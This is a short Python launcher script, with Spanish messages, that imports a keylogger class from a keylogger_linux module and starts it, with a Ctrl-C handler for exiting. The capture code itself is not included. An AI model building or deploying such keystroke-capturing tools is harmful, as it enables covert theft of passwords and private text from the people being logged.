from keylogger_linux import keylogger
import signal 
import sys


def handler (sig,frame):
    print("[!] Saliendo del programa\n")
    sys.exit(1)
 

signal.signal(signal.SIGINT, handler)
if __name__ == "__main__":
    keylog = keylogger()
    keylog.start()